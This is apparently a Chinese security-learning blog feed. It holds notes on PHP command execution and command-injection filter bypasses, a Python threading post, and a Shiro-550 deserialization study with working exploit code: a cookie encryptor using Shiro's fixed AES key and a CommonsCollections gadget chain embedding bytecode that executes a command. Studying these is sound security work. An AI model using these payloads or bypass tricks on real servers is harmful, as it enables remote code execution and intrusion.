<h5 id="3-shell-exec函数"><a href="#3-shell-exec函数" class="headerlink" title="3.shell_exec函数"></a>3.shell_exec函数</h5><p>通过shell环境执行命令,并且将完整的输出以字符串的方式返回,不会自动输出,需要加echo</p>
<p>echo shell_exec(‘whoami’)</p>
<p>root</p>
<h5 id="4-passthru函数"><a href="#4-passthru函数" class="headerlink" title="4.passthru函数"></a>4.passthru函数</h5><p>用于执行外部程序并且显示原始输出</p>
<p>passthru(‘whoami’)</p>
<p>root</p>
<h5 id="5-popen函数"><a href="#5-popen函数" class="headerlink" title="5.popen函数"></a>5.popen函数</h5><p>popen函数用于打开进程文件指针,用法如下:</p>
<p>resource.popen(string $command,string $mode)</p>
<p>例如</p>
<p>popen(“touch test.txt”,”r”);执行该代码后,会在当前目录下创建text.txt文件</p>
<h5 id="6-proc-popen"><a href="#6-proc-popen" class="headerlink" title="6.proc_popen"></a>6.proc_popen</h5><p>用于执行一个命令,并且打开用来输入输出的文件指针.大概相当于popen的数组版</p>
<h5 id="7-反单引号"><a href="#7-反单引号" class="headerlink" title="7.反单引号"></a>7.反单引号</h5><p>反单引号是PHP执行运算符,PHP将尝试将返单引号中的内容作为shell命令来执行,并将其输出信息返回</p>
<p>例如</p>
<p>echo `whoami`;</p>
<p>root</p>
<h4 id="Windows下的命令连接符"><a href="#Windows下的命令连接符" class="headerlink" title="Windows下的命令连接符"></a>Windows下的命令连接符</h4><h5 id="1-amp-命令连接符"><a href="#1-amp-命令连接符" class="headerlink" title="1)&amp;命令连接符"></a>1)&amp;命令连接符</h5><p>&amp;前面的语句为假,则直接执行&amp;后面的语句,&amp;前面的语句为真,则&amp;前后的语句都执行</p>
<h5 id="2-amp-amp-命令连接符"><a href="#2-amp-amp-命令连接符" class="headerlink" title="2)&amp;&amp;命令连接符"></a>2)&amp;&amp;命令连接符</h5><p>&amp;&amp;前面的语句为假,则直接报错,&amp;&amp;后面的语句也不执行</p>
<h5 id="3-命令连接符"><a href="#3-命令连接符" class="headerlink" title="3)|命令连接符"></a>3)|命令连接符</h5><p>|前面的语句为假,则直接报错,|后面的语句也不执行;</p>
<p>|前面的语句为真,则执行|后面的语句</p>
<h5 id="4-命令连接符"><a href="#4-命令连接符" class="headerlink" title="4)||命令连接符"></a>4)||命令连接符</h5><p>||前面的语句为假,则执行||后面的语句;</p>
<p>||前面的语句为真,则只执行||前面的语句,不执行||后面的语句</p>
<h4 id="linux下的命令连接符"><a href="#linux下的命令连接符" class="headerlink" title="linux下的命令连接符"></a>linux下的命令连接符</h4><h5 id="1-命令连接符"><a href="#1-命令连接符" class="headerlink" title="1);命令连接符"></a>1);命令连接符</h5><p>;使多个命令顺序执行,前面的命令和后面的命令都会执行</p>
<h5 id="2-amp-命令连接符"><a href="#2-amp-命令连接符" class="headerlink" title="2)&amp;命令连接符"></a>2)&amp;命令连接符</h5><p>&amp;的作用是使命令在后台运行,这样就可以同时执行多条命令</p>
<p>id&amp;whoami前后命令都会执行</p>
<h5 id="3-amp-amp-命令连接符"><a href="#3-amp-amp-命令连接符" class="headerlink" title="3)&amp;&amp;命令连接符"></a>3)&amp;&amp;命令连接符</h5><p>&amp;&amp;的作用是:如果前面的命令执行成功,则执行后面的命令</p>
<h5 id="4-命令连接符-管道符"><a href="#4-命令连接符-管道符" class="headerlink" title="4)|命令连接符(管道符)"></a>4)|命令连接符(管道符)</h5><p>|的作用是:将前面的命令的输出作为后面的命令的输入,前面的命令和后面的命令都会执行,但是只显示后面的命令的执行效果.</p>
<h5 id="5-命令连接符"><a href="#5-命令连接符" class="headerlink" title="5||命令连接符"></a>5||命令连接符</h5><p>类似于if-else语句,前面执行后面不执行,前面执行失败后面执行</p>
<h3 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h3><h4 id="1-绕过空格过滤"><a href="#1-绕过空格过滤" class="headerlink" title="1.绕过空格过滤"></a>1.绕过空格过滤</h4><h5 id="1-IFS-绕过"><a href="#1-IFS-绕过" class="headerlink" title="1)${IFS}绕过"></a>1)${IFS}绕过</h5><p>$IFS是shell的特殊环境变量,是linux下的内部域分隔符.${IFS}中存储的值可以是空格/制表符/换行符或者其他自定义符号</p>
<h5 id="2-IFS-9绕过"><a href="#2-IFS-9绕过" class="headerlink" title="2)$IFS$9绕过"></a>2)$IFS$9绕过</h5><h5 id="3-制表符绕过"><a href="#3-制表符绕过" class="headerlink" title="3)制表符绕过"></a>3)制表符绕过</h5><p>%09是制表符的url编码,可以通过%09来代替空格,绕过空格过滤</p>
<h5 id="4-绕过"><a href="#4-绕过" class="headerlink" title="4){ }绕过"></a>4){ }绕过</h5><p>空格过滤可以用{ }绕过,例如</p>
<p>{cat,index.php}</p>
<h5 id="5-lt-绕过"><a href="#5-lt-绕过" class="headerlink" title="5)&lt;绕过"></a>5)&lt;绕过</h5><p>例如cat&lt;index.php</p>
<h4 id="2-绕过关键字过滤"><a href="#2-绕过关键字过滤" class="headerlink" title="2.绕过关键字过滤"></a>2.绕过关键字过滤</h4><p><strong>利用反引号绕过``包裹的内容在php中会被当成系统命令执行</strong></p>
<h5 id="1-变量拼接绕过"><a href="#1-变量拼接绕过" class="headerlink" title="1)变量拼接绕过"></a>1)变量拼接绕过</h5><p>linux支持变量赋值,可以通过变量拼接来绕过过滤规则</p>
<p>例如</p>
<p>$a=c;$b=at;$a$b index.php</p>
<h5 id="2-空变量绕过"><a href="#2-空变量绕过" class="headerlink" title="2)空变量绕过"></a>2)空变量绕过</h5><p>例如,可以通过空变量绕过cat命令过滤</p>
<p>ca${x}t index.php</p>
<h5 id="3-系统变量绕过"><a href="#3-系统变量绕过" class="headerlink" title="3)系统变量绕过"></a>3)系统变量绕过</h5><p>${SHELLOPTS}是系统变量,可以利用系统变量的字符拼接绕过过滤</p>
<h5 id="4-绕过-1"><a href="#4-绕过-1" class="headerlink" title="4)\绕过"></a>4)\绕过</h5><p>可以通过c\a\t index.php绕过cat命令过滤</p>
<h5 id="5-通配符绕过-简单正则"><a href="#5-通配符绕过-简单正则" class="headerlink" title="5)通配符绕过(简单正则)"></a>5)通配符绕过(简单正则)</h5><p>linux支持利用通配符进行字符匹配.通配符的作用是在模糊查询时表示文件名中某些不确定的字符</p>
<p>通配符规则如下:</p>
<ul>
<li>*表示0到多个任意字符</li>
<li>?代表一个任意字符</li>
<li>[ ]内为字符范围,代表该字符范围中的任意一个字符</li>
</ul>
<p>例如对于/etc/passwd可以使用/???/???sw?来绕过</p>
<h5 id="6-shell反弹绕过"><a href="#6-shell反弹绕过" class="headerlink" title="6)shell反弹绕过"></a>6)shell反弹绕过</h5><h5 id="7-Base64编码绕过"><a href="#7-Base64编码绕过" class="headerlink" title="7)Base64编码绕过"></a>7)Base64编码绕过</h5><p>利用系统函数base64对命令进行base64编码,以绕过过滤,例如,id命令的base64编码为aWQ=,再利用base64 -d对aWQ=进行解码,就绕过了过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;aWQ=&quot;|base64 -d</span><br></pre></td></tr></table></figure>

<p>原理:利用echo和管道符向base64输入aWQ=,然后由base64 -d解码为id,再因外面包裹的``反引号,将id当命令执行</p>
<h5 id="8-利用expr和awk绕过"><a href="#8-利用expr和awk绕过" class="headerlink" title="8)利用expr和awk绕过"></a>8)利用expr和awk绕过</h5><p>通过expr和awk命令从其他的文件中获取字符并进行命令构造</p>
<p>例如</p>
<h5 id="9-无回显的命令执行如果存在命令执行漏洞-但是没有回显-可以通过shell反弹的方式将shell反弹到vps上-然后通过vps执行命令-如果无法反弹shell-也可以通过-DNS管道解析的方式获取命令的执行结果"><a href="#9-无回显的命令执行如果存在命令执行漏洞-但是没有回显-可以通过shell反弹的方式将shell反弹到vps上-然后通过vps执行命令-如果无法反弹shell-也可以通过-DNS管道解析的方式获取命令的执行结果" class="headerlink" title="9)无回显的命令执行如果存在命令执行漏洞,但是没有回显,可以通过shell反弹的方式将shell反弹到vps上,然后通过vps执行命令.如果无法反弹shell,也可以通过 DNS管道解析的方式获取命令的执行结果"></a>9)无回显的命令执行如果存在命令执行漏洞,但是没有回显,可以通过shell反弹的方式将shell反弹到vps上,然后通过vps执行命令.如果无法反弹shell,也可以通过 DNS管道解析的方式获取命令的执行结果</h5>]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>python多线程学习</title>
    <url>/2022/01/26/python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="python并发简单学习"><a href="#python并发简单学习" class="headerlink" title="python并发简单学习"></a>python并发简单学习</h1><span id="more"></span>

<h3 id="什么是cpu密集型计算-IO密集型计算"><a href="#什么是cpu密集型计算-IO密集型计算" class="headerlink" title="什么是cpu密集型计算,IO密集型计算"></a>什么是cpu密集型计算,IO密集型计算</h3><h4 id="cpu密集型"><a href="#cpu密集型" class="headerlink" title="cpu密集型"></a>cpu密集型</h4><p>cpu密集型特点是cpu占用高,运行效率受到cpu能力限制,比如解压缩,加密解密等</p>
<h4 id="io密集型"><a href="#io密集型" class="headerlink" title="io密集型"></a>io密集型</h4><p>大部分都是读写操作,比如:爬虫,读写数据库等</p>
<h3 id="多线程-多进程-多协程的对比"><a href="#多线程-多进程-多协程的对比" class="headerlink" title="多线程,多进程,多协程的对比"></a>多线程,多进程,多协程的对比</h3><p>前两种,一个进程中,可以启动N个进程</p>
<p>一个线程中,可以启动N个协程</p>
<h4 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h4><h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><p>可以利用多核CPU并行运算</p>
<h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><p>占用资源最多,可启动数据比线程少</p>
<h5 id="适用于"><a href="#适用于" class="headerlink" title="适用于"></a>适用于</h5><p>CPU密集型计算</p>
<h4 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h4><h5 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h5><p>相比进程,更轻量级,占用资源少</p>
<h5 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h5><p>相比进程,多线程只能并发执行,不能利用多CPU(GIL)</p>
<p>相比协程,启动数目有限制,占用内存资源,有线程切换开销</p>
<h5 id="适用于-1"><a href="#适用于-1" class="headerlink" title="适用于"></a>适用于</h5><p>IO密集型计算,同时运行的人物数目要求不多</p>
<h4 id="多协程"><a href="#多协程" class="headerlink" title="多协程"></a>多协程</h4><h5 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h5><p>内存开销最少,启动协程数量最多</p>
<h5 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h5><p>支持的库有限制(aiohttp(√),requests(×)),代码实现复杂</p>
<h5 id="适用于-2"><a href="#适用于-2" class="headerlink" title="适用于"></a>适用于</h5><p>IO密集型计算,需要超多任务运行,但有现成协程库支持的场景</p>
<h3 id="GIL"><a href="#GIL" class="headerlink" title="GIL"></a>GIL</h3><p>全局解释器锁(英语:Global Interpreter Lock,缩写GIL)</p>
<p>是计算机程序设计语言解释器用于同步编程的一种机制,它使得任何时刻仅有一个线程在执行</p>
<p>即便在多核心处理器上,使用GIL的解释器也只允许同一时间执行一个线程,遇到IO操作解锁GIL</p>
<p>Python设计初期,为了规避并发问题引入了GIL,现在想去除却去不掉了</p>
<p>为了解决多线程之间数据完整性和状态同步问题</p>
<h5 id="如何规避GIL限制"><a href="#如何规避GIL限制" class="headerlink" title="如何规避GIL限制"></a>如何规避GIL限制</h5><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220126221005962.png" alt="image-20220126221005962"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220126221037204.png" alt="image-20220126221037204"></p>
<h2 id="python多线程实操"><a href="#python多线程实操" class="headerlink" title="python多线程实操"></a>python多线程实操</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>准备一个函数</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_func</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    do_craw(a,b)</span><br><span class="line"><span class="number">2.</span>怎样创建一个线程</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">t=threading.Thread(target=my_func,args=(<span class="number">100</span>,<span class="number">200</span>))</span><br><span class="line"><span class="number">3.</span>启动线程</span><br><span class="line">t.start()</span><br><span class="line"><span class="number">4.</span>等待结束</span><br><span class="line">t.join()</span><br></pre></td></tr></table></figure>

<p>技巧</p>
<p>可以通过循环和数组来添加线程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urls为一个url</span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">    threads.append(threading.Thread(target=my_func,args=(url,)))<span class="comment">#切记args不能丢了,</span></span><br><span class="line"><span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">    thread.start()</span><br><span class="line"><span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">    thread.join()</span><br></pre></td></tr></table></figure>

<h3 id="待续…………………"><a href="#待续…………………" class="headerlink" title="待续…………………."></a>待续………………….</h3>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>多线程</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro</title>
    <url>/2022/03/19/shiro/</url>
    <content><![CDATA[<h3 id="shiro550反序列化学习"><a href="#shiro550反序列化学习" class="headerlink" title="shiro550反序列化学习"></a>shiro550反序列化学习<span id="more"></span></h3><p>首先idea导入shiro自带的<code>shiro\samples\web</code>maven项目，快速搭建一个shiro项目</p>
<p>分析其中包含的依赖（使用maven helper插件），只有runtime和compile的依赖会在项目运行时存在于项目中，其他test的则无法访问到</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220319180339512.png" alt="image-20220319180339512"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220319180428213.png" alt="image-20220319180428213"></p>
<p>所以一般情况下commons-collections中的链无法利用</p>
<p>使用URLDNS序列化后再编码传入进行测试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap=<span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        URL url=<span class="keyword">new</span> URL(<span class="string">&quot;http://9w6ma81q22bbdpbdg2t2ecbiu90zoo.burpcollaborator.net&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;? extends URL&gt; urlClass = url.getClass();</span><br><span class="line">        Field hashCode = urlClass.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        hashCode.set(url,<span class="number">1234</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">        hashCode.set(url,-<span class="number">1</span>);</span><br><span class="line">        SerializeTest.serialize(hashMap);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="加密脚本"><a href="#加密脚本" class="headerlink" title="加密脚本"></a>加密脚本</h5><p>shiro该版本中AES加密秘钥是固定的</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220319203412860.png" alt="image-20220319203412860"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file_data</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_enc</span>(<span class="params">data</span>):</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    <span class="comment">#iv是初始向量</span></span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_dec</span>(<span class="params">enc_data</span>):</span></span><br><span class="line">    enc_data = base64.b64decode(enc_data)</span><br><span class="line">    unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = enc_data[:<span class="number">16</span>]</span><br><span class="line">    enctyptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    plaintext = enctyptor.decrypt(enc_data[<span class="number">16</span>:])</span><br><span class="line">    <span class="comment"># plaintext=bytes.decode(plaintext)</span></span><br><span class="line">    plaintext = unpad(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    data = get_file_data(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(aes_enc(data))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="CC依赖如果存在"><a href="#CC依赖如果存在" class="headerlink" title="CC依赖如果存在"></a>CC依赖如果存在</h3><p>先导入maven依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//cc3+cc2+cc6缝合,不能用数组</span></span><br><span class="line">    <span class="comment">//原因:首先,cc6不受jdk版本限制,接着cc2不需要数组,如果使用Runtime.exec()就必须使用Transformr数组</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">/*byte[] code= Files.readAllBytes(Paths.get(&quot;H:\\java\\classTest\\MyClass.class&quot;));*/</span></span><br><span class="line">        <span class="keyword">byte</span>[] code= Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQANQoACwAaCgAbABwIAB0KABsAHgcAHwoABQAgCQAhACIIACMKACQAJQcAJgcAJwEA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;Bjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAl0cmFuc2Zvcm0BAHIoTGNv&quot;</span> +</span><br><span class="line">                <span class="string">&quot;bS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9h&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApF&quot;</span> +</span><br><span class="line">                <span class="string">&quot;eGNlcHRpb25zBwAoAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMv&quot;</span> +</span><br><span class="line">                <span class="string">&quot;RE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7&quot;</span> +</span><br><span class="line">                <span class="string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9u&quot;</span> +</span><br><span class="line">                <span class="string">&quot;SGFuZGxlcjspVgEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAHwEAClNvdXJjZUZpbGUBAAxN&quot;</span> +</span><br><span class="line">                <span class="string">&quot;eUNsYXNzLmphdmEMAAwADQcAKQwAKgArAQAEY2FsYwwALAAtAQATamF2YS9pby9JT0V4Y2VwdGlv&quot;</span> +</span><br><span class="line">                <span class="string">&quot;bgwALgANBwAvDAAwADEBACVsYW9kIHN1Y2Nlc3MhISEhISEhISEhISEhISEhISEhISEhISEhBwAy&quot;</span> +</span><br><span class="line">                <span class="string">&quot;DAAzADQBAAdNeUNsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRj&quot;</span> +</span><br><span class="line">                <span class="string">&quot;L3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRl&quot;</span> +</span><br><span class="line">                <span class="string">&quot;cm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVu&quot;</span> +</span><br><span class="line">                <span class="string">&quot;dGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7&quot;</span> +</span><br><span class="line">                <span class="string">&quot;KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UBABBqYXZhL2xhbmcvU3lzdGVt&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3By&quot;</span> +</span><br><span class="line">                <span class="string">&quot;aW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAKAAsAAAAAAAQAAQAMAA0AAQAOAAAAHQAB&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AAEAAAAFKrcAAbEAAAABAA8AAAAGAAEAAAAIAAEAEAARAAIADgAAABkAAAADAAAAAbEAAAABAA8A&quot;</span> +</span><br><span class="line">                <span class="string">&quot;AAAGAAEAAAAYABIAAAAEAAEAEwABABAAFAACAA4AAAAZAAAABAAAAAGxAAAAAQAPAAAABgABAAAA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;HQASAAAABAABABMACAAVAA0AAQAOAAAAWwACAAEAAAAauAACEgO2AARLpwAISyq2AAayAAcSCLYA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;CbEAAQAAAAkADAAFAAIADwAAABoABgAAAAwACQAPAAwADQANAA4AEQARABkAEwAWAAAABwACTAcA&quot;</span> +</span><br><span class="line">                <span class="string">&quot;FwQAAQAYAAAAAgAZ&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map= <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> TiedMapEntry(lazyMap,templates);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map2=<span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line">        <span class="comment">//防止在序列化hashCode的时候触发</span></span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        Field factory = lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        factory.set(lazyMap,invokerTransformer);</span><br><span class="line">        serialize(map2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//HashMap.readObject()-&gt;TiedMapEntry.get()--&gt;LazyMap.get()--&gt;invokerTransformer</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="cookie反序列化流程分析"><a href="#cookie反序列化流程分析" class="headerlink" title="cookie反序列化流程分析"></a>cookie反序列化流程分析</h4><p>首先,在idea中通过双击<code>shift</code>查找关键字,cookie有关的类,找到一个<code>CookieRememberMeManager</code>类</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220319234114164.png" alt="image-20220319234114164"></p>
<p>其中有一个<code>getRemeberedSerializedIdentity</code>方法,它的作用是获取cookie中的base64解码后的bytes,调用它的是<code>getRememberedPrincipals</code>方法</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220319235731776.png" alt="image-20220319235731776"></p>
<p>先获得base64解码后的bytes,然后再调用convertBytesToPrincipals方法,它里面再调用decrypt进行解码</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220320001010886.png" alt="image-20220320001010886"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220320001030875.png" alt="image-20220320001030875"></p>
<p>再调用cipherService接口的decrypt进行解密,解密后得到序列化字符串的bytes</p>
<p>然后对其调用<code>deserialize</code>进行反序列化</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220320001504110.png" alt="image-20220320001504004"></p>
<p>ois.readObject会调用<code>resolveClass</code>方法</p>
<p>这里需要注意的是Shiro并不是使用原生的反序列化，而是重写了ObjectInputStream,重写后的resolveClass方法最终调用的可以理解为findClass去加载类,而findClass是加载不了数组类的</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220320003813486.png" alt="image-20220320003813486"></p>
<h4 id="为什么findClass加载不了数组类"><a href="#为什么findClass加载不了数组类" class="headerlink" title="为什么findClass加载不了数组类?"></a>为什么findClass加载不了数组类?</h4><blockquote>
<p>看了讲解,由于java底层知识严重不足,只能勉强理解成如下</p>
</blockquote>
<p>findClass实质是将包名的路径更换成文件路径去调用defineClass去加载,而不会有class文件起数组的名字</p>
<p>如果是jdk自带的数组类,是可以加载的它调用的是Class.forName,</p>
<p>shiro中如果是网站下面的比如<code>WEBINF</code>下面的就会调用findClass去加载</p>
<h3 id="Shiro无依赖"><a href="#Shiro无依赖" class="headerlink" title="Shiro无依赖"></a>Shiro无依赖</h3><p>Shiro默认是没有CC依赖的,此时怎么通过反序列化开始代码执行呢?</p>
<p>Shiro默认有一个Commons-beanutils依赖,这个依赖中</p>
<p>Commons-beanutils依赖中有一个叫<code>PropertyUtils</code>的类,它有一个<code>getProperty</code>函数,能够通过传入的对象动态的调用其get方法</p>
<p><code>getProperty</code>最后会调用到``PropertyUtilsBean<code>的</code>getSimpleProperty`方法,</p>
<p>descriptor中包含属性值和其get set方法的名字,然后在invokeMethod中进行调用</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220321143032661.png" alt="image-20220321143032661"></p>
<p>恰好<code>TemplatesImpl</code>中有一个叫做<code>getOutputProperties()</code>的无参方法,它调用了cc3中需要调用的<code>newTransformer</code>方法</p>
